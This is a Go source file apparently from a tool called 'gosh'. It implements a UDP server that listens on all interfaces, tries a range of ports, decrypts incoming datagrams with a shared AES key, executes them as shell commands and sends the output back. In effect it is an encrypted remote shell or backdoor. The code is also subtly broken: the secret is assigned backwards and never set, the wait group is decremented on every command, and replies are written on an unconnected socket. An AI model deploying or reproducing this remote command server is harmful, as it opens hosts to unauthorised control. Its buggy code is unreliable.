package server

import (
	"fmt"
	"gosh/constants"
	"gosh/utils"
	"net"
	"sync"
)

var (
	port   int
	secret []byte
	this   *sync.WaitGroup
)

func Start(por int, sec []byte, w *sync.WaitGroup) {
	port = por
	sec = secret
	this = w
	if port <= constants.MaxPort && port >= constants.MinPort {
		for ; port <= constants.MaxPort; port++ {
			udp()
		}
	} else {
		udp()
	}
	fmt.Println("error")
	w.Done()
}

func udp() {
	// todo Custom protocol
	connect, err := net.ListenUDP("udp", &net.UDPAddr{
		IP:   net.IPv4(0, 0, 0, 0),
		Port: port,
	})
	if err != nil {
		return
	}
	// print udp port
	fmt.Println("success", port)

	defer connect.Close()

	cmd := make([]byte, 540)
	for {
		index, addr, err := connect.ReadFromUDP(cmd)
		if err != nil {
			fmt.Println(err)
			continue
		}
		run(cmd[:index], connect, addr)
	}
}
func run(cmd []byte, connect *net.UDPConn, addr *net.UDPAddr) {
	out := ""
	defer func() {
		connect.WriteToUDP([]byte(out), addr)
		this.Done()
	}()
	cmd, err := utils.AesDecrypt(cmd, secret)
	if err != nil {
		out = "error secret"
		return
	}
	utils.Cmd(string(cmd), func(out string) (exit bool) {
		o, err := utils.AesEncrypt([]byte(out), secret)
		if err != nil {
			out = "secret does not meet the regulations"
			return true
		}
		connect.Write(o)
		return false
	})
}
